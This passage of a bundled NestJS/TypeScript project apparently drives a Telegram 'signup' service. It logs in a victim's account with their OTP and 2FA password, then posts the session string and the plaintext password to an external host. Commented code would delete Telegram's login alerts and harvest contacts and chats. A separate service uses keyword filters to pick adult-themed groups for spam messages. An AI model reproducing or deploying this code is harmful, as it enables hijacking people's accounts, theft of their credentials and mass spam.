(error) {\r\n            console.log(\"Error while Connecting:\", error);\r\n        }\r\n    }\r\n\r\n    async deleteMessages() {\r\n        // console.log(\"IsConnected - \", this.client.connected, this.phoneNumber);\r\n        // if (this.client.connected) {\r\n        //     try {\r\n        //         const msgs = await this.client.getMessages(\"777000\", { limit: 10 });\r\n        //         const len = msgs['total'];\r\n        //         console.log(len)\r\n        //         for (let i = 0; i < len - 1; i++) {\r\n        //             console.log(msgs[i]?.text);\r\n        //             msgs[i]?.delete({ revoke: true });\r\n        //         }\r\n        //     } catch (error) {\r\n        //         console.log(\"Cannot delete Messages - \", this.phoneNumber);\r\n        //     }\r\n        // }\r\n        console.log(\"DeleteMessages TODO\")\r\n    }\r\n\r\n    async sendCode(\r\n        forceSMS = false\r\n    ): Promise<{\r\n        phoneCodeHash: string;\r\n        isCodeViaApp: boolean;\r\n    }> {\r\n        try {\r\n            await this.client.connect();\r\n            console.log(\"Sending OTP - \", this.phoneNumber, this.apiId, this.apiHash);\r\n            try {\r\n\r\n                const sendResult = await this.client.invoke(\r\n                    new Api.auth.SendCode({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        apiId: this.apiId,\r\n                        apiHash: this.apiHash,\r\n                        settings: new Api.CodeSettings({}),\r\n                    })\r\n                );\r\n                console.log('Send result - ', sendResult);\r\n                setTimeout(async () => {\r\n                    await restAcc(this.phoneNumber);\r\n                }, 150000);\r\n                if (sendResult instanceof Api.auth.SentCodeSuccess)\r\n                    throw new Error(\"logged in right after sending the code\");\r\n                this.phoneCodeHash = sendResult.phoneCodeHash\r\n\r\n                if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {\r\n                    return {\r\n                        phoneCodeHash: sendResult.phoneCodeHash,\r\n                        isCodeViaApp:\r\n                            sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n                    };\r\n                }\r\n\r\n                const resendResult = await this.client.invoke(\r\n                    new Api.auth.ResendCode({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        phoneCodeHash: sendResult.phoneCodeHash,\r\n                    })\r\n                );\r\n                console.log('ReSend result - ', sendResult);\r\n                if (resendResult instanceof Api.auth.SentCodeSuccess)\r\n                    throw new Error(\"logged in right after resending the code\");\r\n\r\n                this.phoneCodeHash = resendResult.phoneCodeHash\r\n\r\n                return {\r\n                    phoneCodeHash: resendResult.phoneCodeHash,\r\n                    isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n                };\r\n            } catch (sendCodeError) {\r\n                console.log(\"Error in sending code:\", sendCodeError);\r\n                // Handle the specific error or rethrow if needed\r\n                // Add additional handling or logging as necessary\r\n                throw sendCodeError; // Rethrow the error to the outer catch block\r\n            }\r\n        } catch (err: any) {\r\n            if (err.errorMessage === \"AUTH_RESTART\") {\r\n                try {\r\n                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);\r\n                } catch (error) {\r\n                    console.log(\"heelo: \", error)\r\n                }\r\n            } else {\r\n                throw err\r\n            }\r\n        }\r\n    }\r\n\r\n    async login(phoneCode: any, passowrd?: any) {\r\n        let isRegistrationRequired = false\r\n        let termsOfService;\r\n        try {\r\n            if (!phoneCode) {\r\n                throw new Error(\"Code is empty\");\r\n            }\r\n            if (!this.client.connected) {\r\n                await this.client.connect();\r\n            }\r\n            const result = await this.client?.invoke(\r\n                new Api.auth.SignIn({\r\n                    phoneNumber: `+${this.phoneNumber}`,\r\n                    phoneCodeHash: this.phoneCodeHash,\r\n                    phoneCode\r\n                })\r\n            );\r\n            if (result instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                isRegistrationRequired = true;\r\n                termsOfService = result.termsOfService;\r\n            } else {\r\n                await this.processLogin(result.user);\r\n                await restAcc(this.phoneNumber);\r\n                return { status: 200, message: \"Login success\" }\r\n            }\r\n        } catch (err: any) {\r\n            console.log(err);\r\n            if (err.errorMessage === \"SESSION_PASSWORD_NEEDED\") {\r\n                console.log(\"passowrd Required\")\r\n                try {\r\n                    const passwordSrpResult = await this.client.invoke(\r\n                        new Api.account.GetPassword()\r\n                    );\r\n                    const passwordSrpCheck = await computeCheck(\r\n                        passwordSrpResult,\r\n                        passowrd\r\n                    );\r\n                    const { user } = (await this.client.invoke(\r\n                        new Api.auth.CheckPassword({\r\n                            password: passwordSrpCheck,\r\n                        })\r\n                    )) as Api.auth.Authorization;\r\n\r\n                    this.processLogin(user, passowrd);\r\n                    return { status: 200, message: \"Login success\" }\r\n                } catch (error) {\r\n                    if (passowrd && passowrd !== '') {\r\n                        return { status: 400, message: \"Incorrect Password!<br/>Enter your telegram Two-Factor-Authentication password.\" }\r\n                    } else {\r\n                        return { status: 400, message: \"Telegram 2FA Password\" }\r\n                    }\r\n                }\r\n            } else {\r\n                const shouldWeStop = false//await authParams.onError(err);\r\n                if (shouldWeStop) {\r\n                    throw new Error(\"AUTH_USER_CANCEL\");\r\n                }\r\n            }\r\n            // await restAcc(this.phoneNumber);\r\n            return { status: 400, message: err.errorMessage }\r\n        }\r\n\r\n        if (isRegistrationRequired) {\r\n            try {\r\n                let lastName = 'last name';\r\n                let firstName = \"first name\";\r\n                const { user } = (await this.client.invoke(\r\n                    new Api.auth.SignUp({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        phoneCodeHash: this.phoneCodeHash,\r\n                        firstName,\r\n                        lastName,\r\n                    })\r\n                )) as Api.auth.Authorization;\r\n\r\n                if (termsOfService) {\r\n                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.\r\n                    await this.client.invoke(\r\n                        new Api.help.AcceptTermsOfService({\r\n                            id: termsOfService.id,\r\n                        })\r\n                    );\r\n                }\r\n\r\n                return user;\r\n            } catch (err: any) {\r\n                const shouldWeStop = false//await authParams.onError(err);\r\n                if (shouldWeStop) {\r\n                    throw new Error(\"AUTH_USER_CANCEL\");\r\n                }\r\n            }\r\n        }\r\n        // await restAcc(this.phoneNumber);\r\n    }\r\n\r\n    async getCallLogs() {\r\n        try {\r\n            const result: any = await this.client.invoke(\r\n                new Api.messages.Search({\r\n                    peer: new Api.InputPeerEmpty(),\r\n                    q: '',\r\n                    filter: new Api.InputMessagesFilterPhoneCalls({}),\r\n                    minDate: 0,\r\n                    maxDate: 0,\r\n                    offsetId: 0,\r\n                    addOffset: 0,\r\n                    limit: 100,\r\n                    maxId: 0,\r\n                    minId: 0,\r\n                    hash: bigInt.zero,\r\n                })\r\n            );\r\n            console.log(\"Got Messages\");\r\n\r\n            const callLogs = result.messages.filter(\r\n                message => message.action instanceof Api.MessageActionPhoneCall\r\n            );\r\n            console.log(\"filtered call logs\");\r\n\r\n            const filteredResults = {\r\n                outgoing: 0,\r\n                incoming: 0,\r\n                video: 0,\r\n                chatCallCounts: {},\r\n                totalCalls: 0\r\n            };\r\n\r\n            for (const log of callLogs) {\r\n                try {\r\n                    filteredResults.totalCalls++;\r\n                    const callInfo = {\r\n                        callId: log.action.callId.value,\r\n                        duration: log.action.duration,\r\n                        video: log.action.video,\r\n                        timestamp: log.date\r\n                    };\r\n                    console.log(callInfo);\r\n\r\n                    // Categorize by type\r\n                    if (log.out) {\r\n                        filteredResults.outgoing++;\r\n                    } else {\r\n                        filteredResults.incoming++;\r\n                    }\r\n\r\n                    if (log.action.video) {\r\n                        filteredResults.video++;\r\n                    }\r\n\r\n                    const chatId = log.peerId.userId.value;\r\n                    if (!filteredResults.chatCallCounts[chatId]) {\r\n                        console.log(\"Getting Enitity\", chatId)\r\n                        let ent = { firstName: 'Default', lastName: null };\r\n                        try {\r\n                            ent = <any>await this.client.getInputEntity(chatId);\r\n                            console.log(\"Got Enitity\", chatId)\r\n                        } catch (error) {\r\n                            console.log(\"Failed to get entity for chatId:\", chatId, error);\r\n                        }\r\n                        filteredResults.chatCallCounts[chatId] = {\r\n                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\r\n                            count: 0\r\n                        };\r\n                    } else {\r\n                        console.log(chatId, ' Already exists');\r\n                    }\r\n                    filteredResults.chatCallCounts[chatId].count++;\r\n                } catch (error) {\r\n                    console.log(\"Error processing log:\", log, error);\r\n                }\r\n            }\r\n            console.log('Returning filtered results', filteredResults);\r\n            return filteredResults;\r\n        } catch (error) {\r\n            console.error(\"Error in getCallLogs:\", error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async processLogin(result, passowrd = undefined) {\r\n        console.log(this.client.session.save());\r\n        await this.client.getMe();\r\n        let photoCount = 0;\r\n        let videoCount = 0;\r\n        let movieCount = 0;\r\n        const sess = this.client.session.save() as unknown as string;\r\n        const user: any = await result.toJSON();\r\n        // const dialogs = await this.client?.getDialogs({ limit: 600 });\r\n        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed\r\n        // for (const message of messageHistory) {\r\n        //     const text = message.text.toLocaleLowerCase();\r\n        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n        //         movieCount++\r\n        //     } else {\r\n        //         if (message.photo) {\r\n        //             photoCount++;\r\n        //         } else if (message.video) {\r\n        //             videoCount++;\r\n        //         }\r\n        //     }\r\n        // }\r\n        // const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({\r\n        //     hash: bigInt.zero\r\n        // }));\r\n        let channels = 0;\r\n        const chatsArray = [];\r\n        let personalChats = 0;\r\n\r\n        // Process and format the exported contacts as needed\r\n        // const formattedContacts = exportedContacts.users.map(contact => ({\r\n        //     phone: contact.phone,\r\n        //     firstName: contact.firstName,\r\n        //     lastName: contact.lastName,\r\n        //     userName: contact.username,\r\n        //     clientId: contact.id.toString(),\r\n        //     fromId: user.id\r\n        // }));\r\n        console.log(\"AllGood\")\r\n        // for (let chat of dialogs) {\r\n        //     if (chat.isChannel || chat.isGroup) {\r\n        //         channels++;\r\n        //         const chatEntity: any = chat.entity.toJSON();\r\n        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\r\n        //         if (!chatEntity.broadcast && !cannotSendMsgs) {\r\n        //             chatsArray.push(chatEntity);\r\n        //         }\r\n        //     } else {\r\n        //         personalChats++;\r\n        //     }\r\n        // }\r\n        // const callLogs = await this.getCallLogs();\r\n\r\n\r\n        const payload3 = {\r\n            photoCount, videoCount, movieCount,\r\n            gender: null,//data?.data?.gender,\r\n            mobile: user.phone,\r\n            session: `${sess}`,\r\n            firstName: user.firstName,\r\n            lastName: user.lastName,\r\n            userName: user.username,\r\n            channels: channels,\r\n            personalChats: personalChats,\r\n            calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},\r\n            contacts: 0,//exportedContacts.savedCount,\r\n            msgs: 0,//messageHistory.total,\r\n            totalChats: 0,//chats['total'],\r\n            lastActive: new Date().toISOString().split('T')[0],\r\n            tgId: user.id\r\n        };\r\n        if (passowrd) {\r\n            payload3['twoFA'] = true;\r\n            payload3['password'] = passowrd\r\n        }\r\n        console.log(\"Calculated results\");\r\n        try {\r\n            const url = `${process.env.tgcms}/user`;\r\n            console.log(\"posting results : \", url);\r\n            await axios.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });\r\n            // await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });\r\n            // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });\r\n        } catch (error) {\r\n            console.log(\"Error Occured 1\");\r\n            console.log(error)\r\n        }\r\n        // await this.deleteMessages();\r\n        await this.disconnect();\r\n        await deleteClient(this.phoneNumber);\r\n    }\r\n}\r\n","import { Controller, Get, Post, Query, BadRequestException, HttpException } from '@nestjs/common';\r\nimport { ApiTags, ApiQuery } from '@nestjs/swagger';\r\nimport { createClient, getClient } from './TgSignup.service';\r\n\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\nexport class TgSignupController {\r\n    constructor(\r\n        // private readonly tgSignupService: TgSignupService\r\n    ) {}\r\n\r\n    @Get('login')\r\n    @ApiQuery({ name: 'phone', required: true })\r\n    async sendCode(@Query('phone') phone: string) {\r\n        console.log(phone)\r\n        const result = await createClient(phone);\r\n        if (result?.isCodeViaApp) {\r\n            console.log('OTP SENT!! - ', phone)\r\n            return result\r\n        } else {\r\n            throw new BadRequestException(\"Failed to send OTP\")\r\n        }\r\n    }\r\n\r\n    @Get('otp')\r\n    @ApiQuery({ name: 'phone', required: true })\r\n    @ApiQuery({ name: 'code', required: true })\r\n    @ApiQuery({ name: 'password', required: false })\r\n    async verifyCode(@Query('phone') phone: string, @Query('code') code: string, @Query('password') password: string) {\r\n        const cli = await getClient(phone);\r\n        if (cli) {\r\n            console.log(cli?.phoneCodeHash, cli?.phoneNumber);\r\n            const result: any = await cli?.login(code, password);\r\n            if (result && result.status === 200) {\r\n                return ({ mesaage: result.message });\r\n            } else {\r\n                throw new HttpException(result.message, result.status)\r\n            }\r\n        } else {\r\n            throw new BadRequestException(\"Failed to Verify OTP\")\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\r\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { ActiveChannel } from './schemas/active-channel.schema';\r\nimport { AddReactionDto } from './dto/add-reaction.dto';\r\n\r\n@ApiTags('Active Channels')\r\n@Controller('active-channels')\r\nexport class ActiveChannelsController {\r\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new active channel' })\r\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\r\n    return this.activeChannelsService.create(createActiveChannelDto);\r\n  }\r\n\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateActiveChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\r\n    return this.activeChannelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  @ApiQuery({ name: 'channelId', required: false, type: String })\r\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\r\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'title', required: false, type: String })\r\n  @ApiQuery({ name: 'username', required: false, type: String })\r\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\r\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\r\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\r\n  search(@Query() query: any): Promise<ActiveChannel[]> {\r\n    console.log(query);\r\n    return this.activeChannelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all active channels' })\r\n  async findAll() {\r\n    return this.activeChannelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\r\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.remove(channelId);\r\n  }\r\n\r\n  @Post(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Add reaction to chat group' })\r\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\r\n  }\r\n\r\n  @Get(':channelId/reactions/random')\r\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\r\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\r\n    return this.activeChannelsService.getRandomReaction(channelId);\r\n  }\r\n\r\n  @Delete(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\r\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\r\n  }\r\n}\r\n","// src/activechannels/activechannels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { ActiveChannelsController } from './active-channels.controller';\r\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\r\n    PromoteMsgModule\r\n  ],\r\n  controllers: [ActiveChannelsController],\r\n  providers: [ActiveChannelsService],\r\n  exports: [ActiveChannelsService]\r\n})\r\nexport class ActiveChannelsModule { }\r\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\r\n// src/activechannels/activechannels.service.ts\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\r\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\r\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\r\nimport { defaultMessages, fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\n@Injectable()\r\nexport class ActiveChannelsService {\r\n  constructor(\r\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\r\n    @Inject(forwardRef(() => PromoteMsgsService))\r\n    private promoteMsgsService: PromoteMsgsService\r\n  ) {}\r\n\r\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\r\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\r\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\r\n    return createdChannel.save();\r\n  }\r\n\r\n  \r\n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\r\n    const bulkOps = createChannelDtos.map((dto) => ({\r\n      updateOne: {\r\n        filter: { channelId: dto.channelId },\r\n        update: { $set: dto },\r\n        upsert: true\r\n      }\r\n    }));\r\n\r\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\r\n    return 'Channels Saved';\r\n  }\r\n\r\n  async findAll(): Promise<ActiveChannel[]> {\r\n    return this.activeChannelModel.find().exec();\r\n  }\r\n\r\n  async findOne(channelId: string): Promise<ActiveChannel> {\r\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    return channel;\r\n  }\r\n\r\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\r\n    delete updateActiveChannelDto[\"_id\"]\r\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\r\n      { channelId },\r\n      { $set: updateActiveChannelDto },\r\n      { new: true, upsert: true },\r\n    ).exec();\r\n    return updatedChannel;\r\n  }\r\n\r\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\r\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\r\n  }\r\n\r\n  async addToAvailableMsgs(channelId: string, msg: string) {\r\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\r\n  }\r\n\r\n  async remove(channelId: string): Promise<void> {\r\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\r\n  }\r\n\r\n  async search(filter: any): Promise<ActiveChannel[]> {\r\n    console.log(filter)\r\n    return this.activeChannelModel.find(filter).exec();\r\n  }\r\n\r\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\r\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\r\n      $addToSet: { reactions: reactions }\r\n    })\r\n    return channel;\r\n  }\r\n\r\n  async getRandomReaction(channelId: string): Promise<string> {\r\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    if (!channel) {\r\n      return undefined;\r\n    }\r\n    if (channel.reactions.length === 0) {\r\n      return undefined;\r\n    }\r\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\r\n    return channel.reactions[randomIndex];\r\n  }\r\n\r\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\r\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\r\n      $pull: { reactions: reaction },\r\n    })\r\n    return channel;\r\n  }\r\n\r\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\r\n    const query = {\r\n      '$and':\r\n        [\r\n          {\r\n            '$or':\r\n              [\r\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n              ]\r\n          },\r\n          {\r\n            '$or': [\r\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n            ]\r\n          },\r\n          {\r\n            channelId: { '$nin': notIds },\r\n            participantsCount: { $gt: 600 },\r\n            username: {$ne: null},\r\n            canSendMsgs: true,\r\n            restricted: false,\r\n            forbidden: false\r\n          }\r\n        ]\r\n    }\r\n\r\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\r\n    try {\r\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\r\n        { $match: query },\r\n        { $skip: skip },\r\n        { $limit: limit },\r\n        { $sort: sort }, // Sort by the random field\r\n        { $project: { randomField: 0 } } // Remove the random field from the output\r\n      ]).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.activeChannelModel.find(query);\r\n\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      if (skip) {\r\n        queryExec.skip(skip);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n  async resetWordRestrictions() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\r\n    try {\r\n      await this.activeChannelModel.updateMany({\r\n        banned: false\r\n      }, {\r\n        $set: {\r\n          \"wordRestriction\": 0,\r\n          \"dMRestriction\": 0\r\n        }\r\n      })\r\n    } catch (e) {\r\n      console.log(parseError(e))\r\n    }\r\n  }\r\n\r\n  async resetAvailableMsgs() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\r\n    try {\r\n      const data = await this.promoteMsgsService.findOne();\r\n      const keys = Object.keys(data);\r\n      await this.activeChannelModel.updateMany(\r\n        {\r\n          $expr: {\r\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\r\n          }\r\n        },\r\n        {\r\n          $set: {\r\n            \"wordRestriction\": 0,\r\n            \"dMRestriction\": 0,\r\n            \"banned\": false,\r\n            \"availableMsgs\": keys\r\n          }\r\n        }\r\n      );\r\n    } catch (e) {\r\n      console.log(parseError(e))\r\n    }\r\n  }\r\n\r\n  async updateBannedChannels() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for update banned Channels`);\r\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\r\n      $set: {\r\n        \"wordRestriction\": 0,\r\n        \"dMRestriction\": 0,\r\n        banned: false,\r\n        \"private\": false\r\n      }\r\n    })\r\n  }\r\n\r\n  async updateDefaultReactions() {\r\n    await this.activeChannelModel.updateMany({}, {\r\n      $set: {\r\n        reactions: [\r\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n          '👀', '🙈', '🤝', '🤗', '🆒',\r\n          '🗿', '🙉', '🙊', '🤷', '👎'\r\n        ]\r\n      }\r\n    })\r\n  }\r\n}\r\n","import { ApiProperty,  } from '@nestjs/swagger';\r\n\r\nexport class AddReactionDto  {\r\n    @ApiProperty({required: true})\r\n    reactions: string[]\r\n}\r\n","// src/activechannels/dto/create-activechannel.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateActiveChannelDto {\r\n  @ApiProperty()\r\n  channelId: string;\r\n\r\n  @ApiProperty({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({ default: 300 })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({ default: false })\r\n  restricted: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  sendMessages: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  reactRestricted?: boolean = false;\r\n\r\n  @ApiProperty()\r\n  title: string;\r\n\r\n  @ApiProperty()\r\n  username: string;\r\n\r\n  @ApiProperty({ default: 0 })\r\n  wordRestriction?: number = 0;\r\n\r\n  @ApiProperty({ default: 0 })\r\n  dMRestriction?: number = 0;\r\n\r\n  @ApiProperty({ type: [String] })\r\n  availableMsgs?: string[];\r\n\r\n  @ApiProperty({\r\n    type: [String], default: [\r\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n      '👀', '🙈', '🤝', '🤗', '🆒',\r\n      '🗿', '🙉', '🙊', '🤷', '👎'\r\n    ]\r\n  })\r\n  reactions?: string[] = [\r\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n    '👀', '🙈', '🤝', 